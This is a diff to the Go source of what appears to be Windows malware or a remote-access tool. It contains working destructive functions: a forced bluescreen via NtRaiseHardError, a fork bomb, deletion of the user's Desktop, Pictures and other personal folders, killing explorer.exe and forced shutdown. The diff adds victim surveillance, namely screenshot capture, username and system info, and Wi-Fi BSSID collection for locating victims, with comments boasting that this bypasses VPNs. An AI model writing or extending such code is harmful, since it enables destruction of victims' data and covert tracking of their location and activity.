@@ -14,18 +14,27 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/user"
 	"regexp"
+	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
 type SysInfo struct {
 	IP       string
+	BSSID    string
 	Hostname string
 	Platform string
 	CPU      string
 	RAM      uint64
 	Disk     uint64
+}
+
+type Screenshot struct {
+	BLOB      []byte
+	Timestamp string
 }
 
 var (
@@ -34,11 +43,14 @@ var (
 	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
 )
 
+// triggers a bluescreen based on the `opcode` hexadecimal integer
 func DoBSoD(opcode uintptr) {
 	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
 	NtRaiseHardError.Call(opcode, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
 }
 
+// this will starve the system of resources; creating a major lag spike before crashing the system
+// basic fork bomb, nothing special here lol.
 func StarveSystem() {
 	file := TEMP + "\\" + RandStringBytes(8) + ".bat"
 
@@ -54,6 +66,7 @@ func StarveSystem() {
 	exec.Command("cmd.exe", "/C", file).Start()
 }
 
+// self explanatory, deletes all files in the windows default personal directories
 func DeletePersonal() {
 	NukeDirectory("Desktop")
 	NukeDirectory("Pictures")
@@ -69,6 +82,7 @@ func NukeDirectory(dir string) {
 	os.MkdirAll(PERSONAL+"OneDrive\\"+dir, 777)
 }
 
+// kills the `explorer.exe` task, which causes the desktop and taskbar to disappear
 func KillDesktop() {
 	err := exec.Command("cmd.exe", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
 	if err != nil {
@@ -76,22 +90,26 @@ func KillDesktop() {
 	}
 }
 
+// immediately force-shuts down the system without waiting for processes to terminate
 func ForceShutdown() {
 	if err := exec.Command("cmd.exe", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
 		fmt.Println("Failed to initiate shutdown:", err)
 	}
 }
 
-func GetScreenShot() []byte {
+// snaps a screenshot of the current view, returns the raw bytes and timestamp of the image
+// this will likely be detected, since we are currently using an external library for this
+func GetScreenShot() Screenshot {
 	if _, err := os.Stat(TEMPFILEDIR); os.IsNotExist(err) {
 		os.MkdirAll(TEMPFILEDIR, 0700)
 	}
 
 	img, err := screenshot.CaptureScreen()
+	ts := time.Now().Format("YYYY-MM-DD HH:MM:SS")
 	if err != nil {
 		panic(err)
 	}
-	f, err := os.Create(TEMPFILEDIR + "\\CAPTURE.png")
+	f, err := os.Create(TEMPFILEDIR + "\\A.png")
 	if err != nil {
 		panic(err)
 	}
@@ -101,11 +119,15 @@ func GetScreenShot() []byte {
 	}
 	var _ = f.Close()
 
-	data, _ := os.ReadFile(TEMPFILEDIR + "\\CAPTURE.png")
+	data, _ := os.ReadFile(TEMPFILEDIR + "\\A.png")
 
-	return data
+	return Screenshot{
+		BLOB:      data,
+		Timestamp: ts,
+	}
 }
 
+// gets general system info & specs
 func GetSysInfo() *SysInfo {
 	hostStat, _ := host.Info()
 	cpuStat, _ := cpu.Info()
@@ -119,6 +141,7 @@ func GetSysInfo() *SysInfo {
 	body, _ := io.ReadAll(resp.Body)
 
 	System.IP = string(body)
+	System.BSSID = GetBSSID()
 	System.Hostname = hostStat.Hostname
 	System.CPU = cpuStat[0].ModelName
 	System.Platform = hostStat.Platform
@@ -128,6 +151,22 @@ func GetSysInfo() *SysInfo {
 	return System
 }
 
+// gets the username of the current user
+func GetUsername() string {
+	user, err := user.Current()
+	if err != nil {
+		log.Fatalf(err.Error())
+	}
+
+	if strings.Contains(user.Username, "\\") {
+		return strings.Split(user.Username, "\\")[1]
+	} else {
+		return user.Username
+	}
+}
+
+// gets the BSSID of the connected network (used to find location)
+// THIS WILL BYPASS VPNs!!! but does NOT work for LAN.
 func GetBSSID() string {
 	out, err := exec.Command("cmd", "/c", "netsh wlan show interfaces").CombinedOutput()
 	if err != nil {
@@ -149,6 +188,7 @@ func GetBSSID() string {
 	}
 }
 
+// displays x error message with `title` title and `description` description
 func DisplayErrorMsg(title string, description string) {
 	dialog.Message{
 		Title:  title,
